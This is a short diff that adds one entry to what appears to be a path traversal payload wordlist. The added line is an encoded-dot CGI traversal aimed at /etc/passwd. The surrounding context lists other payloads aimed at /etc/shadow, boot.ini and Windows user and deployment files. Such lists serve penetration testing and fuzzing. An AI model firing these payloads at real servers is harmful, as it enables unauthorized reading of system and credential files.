@@ -113,6 +113,7 @@
 /./././././././././././etc/passwd
 /./././././././././././etc/shadow
 /.\\./.\\./.\\./.\\./.\\./.\\./boot.ini
+/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 C:/$recycle.bin/s-1-5-18/desktop.ini
 C:/Documents and Settings/Administrator/NTUser.dat
 C:/MININT/SMSOSD/OSDLOGS/VARIABLES.DAT
